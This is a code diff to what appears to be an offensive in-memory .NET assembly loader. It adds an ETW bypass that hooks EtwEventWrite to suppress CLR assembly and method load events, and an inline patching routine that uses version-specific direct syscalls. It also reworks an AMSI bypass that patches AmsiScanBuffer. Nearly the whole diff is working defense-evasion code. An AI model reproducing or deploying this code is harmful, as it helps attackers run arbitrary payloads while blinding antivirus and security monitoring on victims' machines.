@@ -7,12 +7,30 @@
 
 #include "stdafx.h"
 #include <stdio.h>
+#include <windows.h>
+#include <evntprov.h>
 #include "HostingCLR.h"
+#include "EtwTamper.h"
+
+// https://docs.microsoft.com/en-us/dotnet/framework/performance/etw-events-in-the-common-language-runtime
+#define ModuleLoad_V2 152
+#define AssemblyDCStart_V1 155
+#define MethodLoadVerbose_V1 143
+#define MethodJittingStarted 145
+#define ILStubGenerated 88
 
 unsigned char amsiflag[1];
+unsigned char etwflag[1];
 
 char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
 char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };
+
+// mov rax, <Hooked function address>  
+// jmp rax
+unsigned char uHook[] = {
+	0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0xFF, 0xE0
+};
 
 #ifdef _X32
 unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
@@ -95,14 +113,18 @@ int executeSharp(LPVOID lpPayload)
 	unsigned char *offsetamsi = allData + 8;
 	//Store amsi flag 
 	memcpy(amsiflag, offsetamsi, 1);
+
+	unsigned char *offsetetw = allData + 9;
+	//Store amsi flag 
+	memcpy(etwflag, offsetetw, 1);
 	
 	//Taking pointer to args
-	unsigned char *offsetargs = allData + 9;
+	unsigned char *offsetargs = allData + 10;
 	//Store parameters 
 	memcpy(arg_s, offsetargs, raw_args_length);
 
 	//Taking pointer to assembly
-	unsigned char *offset = allData + raw_args_length + 9;
+	unsigned char *offset = allData + raw_args_length + 10;
 	//Store assembly
 	memcpy(pvData, offset, raw_assembly_length);
 
@@ -123,6 +145,17 @@ int executeSharp(LPVOID lpPayload)
 	{
 		printf("Failed SafeArrayUnaccessData w/hr 0x%08lx\n", hr);
 		return -1;
+	}
+
+	//Etw bypass
+	if (etwflag[0] == '\x01')
+	{
+		int ptcResult = PatchEtw();
+		if (ptcResult == -1)
+		{
+			printf("Etw bypass failed\n");
+			return -1;
+		}
 	}
 
 	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);
@@ -204,7 +237,8 @@ int executeSharp(LPVOID lpPayload)
 	//Amsi bypass
 	if (amsiflag[0] == '\x01')
 	{
-		if(!BypassAmsi())
+		int ptcResult = PatchAmsi();
+		if (ptcResult == -1)
 		{
 			printf("Amsi bypass failed\n");
 			return -1;
@@ -328,34 +362,127 @@ BOOL FindVersion(void * assembly, int length)
 	return FALSE;
 }
 
-BOOL BypassAmsi()
+ULONG NTAPI MyEtwEventWrite(
+	__in REGHANDLE RegHandle,
+	__in PCEVENT_DESCRIPTOR EventDescriptor,
+	__in ULONG UserDataCount,
+	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData)
 {
-	return PatchAmsi();
+	ULONG uResult = 0;
+
+	_EtwEventWriteFull EtwEventWriteFull = (_EtwEventWriteFull)
+		GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWriteFull");
+	if (EtwEventWriteFull == NULL) {
+		return 1;
+	}
+
+	switch (EventDescriptor->Id) {
+	case AssemblyDCStart_V1:
+		// Block CLR assembly loading events.
+		break;
+	case MethodLoadVerbose_V1:
+		// Block CLR method loading events.
+		break;
+	case ILStubGenerated:
+		// Block MSIL stub generation events.
+		break;
+	default:
+		// Forward all other ETW events using EtwEventWriteFull.
+		uResult = EtwEventWriteFull(RegHandle, EventDescriptor, 0, NULL, NULL, UserDataCount, UserData);
+	}
+
+	return uResult;
+}
+
+INT InlinePatch(LPVOID lpFuncAddress, UCHAR * patch) {
+	PNT_TIB pTIB = NULL;
+	PTEB pTEB = NULL;
+	PPEB pPEB = NULL;
+
+	// Get pointer to the TEB
+	pTIB = (PNT_TIB)__readgsqword(0x30);
+	pTEB = (PTEB)pTIB->Self;
+
+	// Get pointer to the PEB
+	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
+	if (pPEB == NULL) {
+		return -1;
+	}
+
+	if (pPEB->OSMajorVersion == 10 && pPEB->OSMinorVersion == 0) {
+		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
+		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
+	}
+	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 1 && pPEB->OSBuildNumber == 7601) {
+		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
+		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
+	}
+	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 2) {
+		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
+		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
+	}
+	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 3) {
+		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
+		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
+	}
+	else {
+
+		return -2;
+	}
+
+	LPVOID lpBaseAddress = lpFuncAddress;
+	ULONG OldProtection, NewProtection;
+	SIZE_T uSize = sizeof(patch);
+	NTSTATUS status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
+	if (status != STATUS_SUCCESS) {
+		return -1;
+	}
+
+	status = ZwWriteVirtualMemory(NtCurrentProcess(), lpFuncAddress, (PVOID)patch, sizeof(patch), NULL);
+	if (status != STATUS_SUCCESS) {
+		return -1;
+	}
+
+	status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
+	if (status != STATUS_SUCCESS) {
+		return -1;
+	}
+
+	return 0;
+}
+
+BOOL PatchEtw()
+{
+	printf("Patching EtwEventWrite\n");
+
+	HMODULE lib = LoadLibraryA("ntdll.dll");
+	if (lib == NULL)
+		return -2;
+
+	LPVOID lpFuncAddress = GetProcAddress(lib, "EtwEventWrite");
+	if (lpFuncAddress == NULL)
+		return -2;
+
+	// Add address of hook function to patch.
+	*(DWORD64*)&uHook[2] = (DWORD64)MyEtwEventWrite;
+
+	return InlinePatch(lpFuncAddress, uHook);
 }
 
 BOOL PatchAmsi()
 {
 
+	printf("Patching amsi\n");
+
 	HMODULE lib = LoadLibraryA("amsi.dll");
 	if (lib == NULL)
-		return false;
+		return -2;
 
 	LPVOID addr = GetProcAddress(lib, "AmsiScanBuffer");
 	if(addr == NULL)
-		return false;
+		return -2;
 
-	DWORD oldProtect;
-
-	if (!VirtualProtect(addr, patchsize, 0x40, &oldProtect))
-		return false;
-
-	memcpy(addr, amsipatch, patchsize);
-
-	if(!VirtualProtect(addr, patchsize, oldProtect, &oldProtect))
-		return false;
-
-	return true;
-
+	return InlinePatch(addr, amsipatch);
 }
 
 BOOL ClrIsLoaded(LPCWSTR version, IEnumUnknown* pEnumerator, LPVOID * pRuntimeInfo) {
